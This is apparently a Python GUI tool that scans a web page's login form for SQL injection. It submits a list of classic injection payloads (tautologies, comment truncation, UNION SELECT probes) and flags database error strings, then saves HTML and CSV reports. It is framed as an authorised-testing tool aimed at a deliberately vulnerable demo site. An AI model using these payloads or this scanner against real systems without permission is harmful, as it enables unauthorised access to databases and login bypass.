# sql_scanner.py
import os
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import threading
import cv2
from PIL import Image, ImageTk
import requests
import webbrowser
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import csv
import json
from datetime import datetime
import html

class SQLInjectionScanner:
    def __init__(self, root):
        self.root = root
        self.root.title("SQL Injection Scanner - Authorized Testing Only")
        self.root.geometry("900x700")
        
        self.scanning = False
        self.results = []
        self.payloads = [
            "'",
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "1' AND '1'='2",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ]
        
        self.setup_ui()
    
    def setup_ui(self):
        # Title
        title_label = tk.Label(
            self.root, 
            text="SQL Injection Scanner", 
            font=("Arial", 20, "bold"),
            fg="#cc0000"
        )
        title_label.pack(pady=10)
        
        warning_label = tk.Label(
            self.root,
            text="⚠️ FOR AUTHORIZED TESTING ONLY - USE RESPONSIBLY ⚠️",
            font=("Arial", 10, "bold"),
            fg="#ff6600"
        )
        warning_label.pack(pady=5)
        
        # URL Input Frame
        input_frame = tk.Frame(self.root)
        input_frame.pack(pady=10, padx=20, fill="x")
        
        tk.Label(input_frame, text="Target URL:", font=("Arial", 10)).pack(anchor="w")
        self.url_entry = tk.Entry(input_frame, font=("Arial", 10), width=70)
        self.url_entry.pack(fill="x", pady=5)
        self.url_entry.insert(0, "http://testphp.vulnweb.com/artists.php?artist=1")
        
        # Buttons Frame
        button_frame = tk.Frame(self.root)
        button_frame.pack(pady=10)
        
        self.scan_btn = tk.Button(
            button_frame,
            text="Start Scan",
            command=self.start_scan,
            bg="#28a745",
            fg="white",
            font=("Arial", 11, "bold"),
            width=15,
            height=2
        )
        self.scan_btn.grid(row=0, column=0, padx=5)
        
        self.stop_btn = tk.Button(
            button_frame,
            text="Stop Scan",
            command=self.stop_scan,
            bg="#dc3545",
            fg="white",
            font=("Arial", 11, "bold"),
            width=15,
            height=2,
            state="disabled"
        )
        self.stop_btn.grid(row=0, column=1, padx=5)

        # REPORT button (disabled until results exist)
        self.report_btn = tk.Button(
            button_frame,
            text="Generate Report",
            command=self.on_generate_report,
            bg="#007bff",
            fg="white",
            font=("Arial", 10, "bold"),
            width=16,
            height=2,
            state="disabled"
        )
        self.report_btn.grid(row=0, column=2, padx=5)
        
        # Progress Bar
        self.progress = ttk.Progressbar(
            self.root, 
            orient="horizontal", 
            length=600, 
            mode="determinate"
        )
        self.progress.pack(pady=10)
        
        # Results Tree
        tree_frame = tk.Frame(self.root)
        tree_frame.pack(pady=10, padx=20, fill="both", expand=True)
        
        tk.Label(tree_frame, text="Scan Results:", font=("Arial", 11, "bold")).pack(anchor="w")
        
        # Scrollbars
        tree_scroll_y = tk.Scrollbar(tree_frame)
        tree_scroll_y.pack(side="right", fill="y")
        
        tree_scroll_x = tk.Scrollbar(tree_frame, orient="horizontal")
        tree_scroll_x.pack(side="bottom", fill="x")
        
        self.tree = ttk.Treeview(
            tree_frame,
            columns=("Payload", "URL", "Vulnerable", "Error", "Type"),
            show="headings",
            yscrollcommand=tree_scroll_y.set,
            xscrollcommand=tree_scroll_x.set
        )
        
        tree_scroll_y.config(command=self.tree.yview)
        tree_scroll_x.config(command=self.tree.xview)
        
        # Define columns
        self.tree.heading("Payload", text="Payload")
        self.tree.heading("URL", text="Action URL")
        self.tree.heading("Vulnerable", text="Vulnerable")
        self.tree.heading("Error", text="Error Category")
        self.tree.heading("Type", text="SQLi Type")
        
        self.tree.column("Payload", width=150)
        self.tree.column("URL", width=250)
        self.tree.column("Vulnerable", width=80)
        self.tree.column("Error", width=150)
        self.tree.column("Type", width=120)
        
        self.tree.pack(fill="both", expand=True)
    
    def is_sql_injection(self, response_text):
        """Check if response contains SQL error indicators"""
        SQLI_ERRORS = [
            "you have an error in your sql syntax;",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "sqlstate[hy000]",
            "unterminated string constant",
            "syntax error"
        ]
        text = (response_text or "").lower()
        return any(error in text for error in SQLI_ERRORS)
    
    def extract_error_info(self, text):
        """Extract SQL injection type and category"""
        text = (text or "").lower()
        if "union" in text:
            return "Union Usage", "In-band (Union-Based)"
        elif "syntax" in text:
            return "Syntax Error", "In-band (Error-Based)"
        elif "mysql" in text:
            return "MySQL Error", "In-band (Error-Based)"
        elif "unexpected" in text:
            return "Unexpected Token", "In-band (Error-Based)"
        elif "unknown" in text:
            return "Unknown Column", "Inferential (Boolean-Based)"
        elif "sleep" in text or "benchmark" in text:
            return "Time Delay Found", "Inferential (Time-Based)"
        elif "error" in text or "query" in text:
            return "Generic SQL Error", "In-band (Error-Based)"
        return "Unknown", "Unknown"
    
    def extract_form_details(self, form, base_url):
        """Extract form details including action, method, and inputs"""
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        form_details = {
            "action": urljoin(base_url, action),
            "method": method,
            "inputs": []
        }
        for input_tag in inputs:
            input_type = input_tag.get("type", "text")
            name = input_tag.get("name")
            value = input_tag.get("value", "")
            if name:
                form_details["inputs"].append({
                    "type": input_type,
                    "name": name,
                    "value": value
                })
        return form_details
    
    def find_login_forms(self, url):
        """Find login forms on the target page"""
        try:
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            return forms if forms else None
        except Exception as e:
            return None
    
    def test_sql_injection(self, url, form_details, payload):
        """Test a form with SQL injection payload"""
        if not self.scanning:
            return None
        
        data = {}
        for input_field in form_details["inputs"]:
            if input_field["type"] in ["text", "password"]:
                data[input_field["name"]] = payload
            else:
                data[input_field["name"]] = input_field["value"]
        
        try:
            if form_details["method"] == "post":
                response = requests.post(
                    form_details["action"], 
                    data=data, 
                    timeout=10
                )
            else:
                response = requests.get(
                    form_details["action"], 
                    params=data, 
                    timeout=10
                )
            
            if self.is_sql_injection(response.text):
                vulnerable = "Yes"
                error_category, sqli_type = self.extract_error_info(response.text)
            else:
                vulnerable = "No"
                error_category, sqli_type = "-", "-"
            
            result = (
                payload, 
                form_details["action"], 
                vulnerable, 
                error_category, 
                sqli_type, 
                response.status_code
            )
            return result
            
        except Exception as e:
            result = (
                payload, 
                form_details["action"], 
                "No", 
                "Network Error", 
                "-", 
                str(e)
            )
            return result
    
    def scan_thread(self):
        """Main scanning thread"""
        url = self.url_entry.get().strip()
        
        if not url:
            messagebox.showerror("Error", "Please enter a target URL.")
            return
        
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url
        
        self.scanning = True
        self.results.clear()
        
        # Clear previous results
        for item in self.tree.get_children():
            self.tree.delete(item)
        
        self.progress["value"] = 0
        self.progress["maximum"] = len(self.payloads)
        
        # Find login forms
        forms = self.find_login_forms(url)
        if not forms:
            messagebox.showerror("Error", "No login forms found.")
            self.scanning = False
            self.scan_btn.config(state="normal")
            self.stop_btn.config(state="disabled")
            return
        
        form = forms[0]
        form_details = self.extract_form_details(form, url)
        action_url = form_details["action"]
        
        # Test each payload
        for payload in self.payloads:
            if not self.scanning:
                break
            
            result = self.test_sql_injection(url, form_details, payload)
            if result:
                self.results.append(result)
                self.tree.insert("", "end", values=result)
                # enable report button when results present
                self.report_btn.config(state="normal")
            
            self.progress["value"] += 1
            self.root.update_idletasks()
        
        self.scanning = False
        vuln_count = sum(1 for r in self.results if r[2] == "Yes")
        messagebox.showinfo(
            "Scan Complete", 
            f"Scan completed! {vuln_count} vulnerabilities found."
        )
        
        self.scan_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
    
    def start_scan(self):
        """Start the scanning process"""
        self.scan_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        
        # Start scan in separate thread
        scan_thread = threading.Thread(target=self.scan_thread)
        scan_thread.daemon = True
        scan_thread.start()
    
    def stop_scan(self):
        """Stop the scanning process"""
        self.scanning = False
        self.scan_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        messagebox.showinfo("Stopped", "Scan stopped by user.")
    
    # -------------------- Report generation --------------------
    def generate_html_report(self, filename="scan_report.html"):
        """
        Build an HTML report from self.results and save it.
        Then open it in the default browser.
        """
        total = len(self.results)
        vulnerable_count = sum(1 for r in self.results if len(r) >= 3 and str(r[2]).lower() == "yes")
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        html_parts = []
        html_parts.append(f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Scan Report - {html.escape(self.url_entry.get() or '')}</title>
<style>
body{{font-family:Arial,Helvetica,sans-serif;margin:20px;background:#f7f7f7;color:#222}}
.container{{background:#fff;padding:18px;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,0.08)}}
h1{{color:#cc0000}}
.summary{{margin-bottom:12px}}
table{{width:100%;border-collapse:collapse;margin-top:12px}}
th,td{{padding:8px;border:1px solid #ddd;text-align:left;font-size:14px}}
th{{background:#222;color:#fff}}
.vuln{{background:#ffecec}}
</style>
</head>
<body>
<div class="container">
<h1>Scan Report</h1>
<div class="summary">
<strong>Target:</strong> {html.escape(self.url_entry.get() or 'N/A')}<br/>
<strong>Run at:</strong> {now}<br/>
<strong>Total payloads tested (rows):</strong> {total} &nbsp;&nbsp;
<strong>Vulnerabilities flagged:</strong> {vulnerable_count}
</div>
<table>
<thead><tr>
<th>#</th><th>Payload</th><th>Action URL</th><th>Vulnerable</th><th>Error Category</th><th>SQLi Type</th><th>HTTP/Status</th>
</tr></thead>
<tbody>
""")

        for i, row in enumerate(self.results, start=1):
            payload = html.escape(str(row[0])) if len(row) > 0 else ""
            action = html.escape(str(row[1])) if len(row) > 1 else ""
            vuln = html.escape(str(row[2])) if len(row) > 2 else ""
            errcat = html.escape(str(row[3])) if len(row) > 3 else ""
            stype = html.escape(str(row[4])) if len(row) > 4 else ""
            status = html.escape(str(row[5])) if len(row) > 5 else ""
            tr_class = 'class="vuln"' if str(vuln).lower() == "yes" else ""
            html_parts.append(f"<tr {tr_class}><td>{i}</td><td>{payload}</td><td>{action}</td><td>{vuln}</td><td>{errcat}</td><td>{stype}</td><td>{status}</td></tr>")

        html_parts.append("""</tbody></table>
<br/><p>Report generated by SQLInjectionScanner (dry-run or active as configured).</p>
</div></body></html>""")

        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join(html_parts))

        # Also write a CSV copy (optional)
        csv_name = filename.replace(".html", ".csv")
        try:
            with open(csv_name, "w", newline="", encoding="utf-8") as f:
                w = csv.writer(f)
                w.writerow(["payload","action_url","vulnerable","error_category","sqli_type","status_or_error"])
                for r in self.results:
                    row = list(r) + [""] * (6 - len(r))
                    w.writerow([str(x) for x in row[:6]])
        except Exception:
            pass  # non-fatal

        # Open in browser
        webbrowser.open(f"file://{os.path.abspath(filename)}")

    def on_generate_report(self):
        if not self.results:
            messagebox.showinfo("No results", "No scan results available to report.")
            return
        fname = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML file","*.html"),("All files","*.*")], title="Save report as")
        if not fname:
            return
        try:
            self.generate_html_report(filename=fname)
            messagebox.showinfo("Report saved", f"Report saved and opened: {fname}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create report: {e}")
    # -------------------- End report generation --------------------

if __name__ == "__main__":
    root = tk.Tk()
    app = SQLInjectionScanner(root)
    root.mainloop()
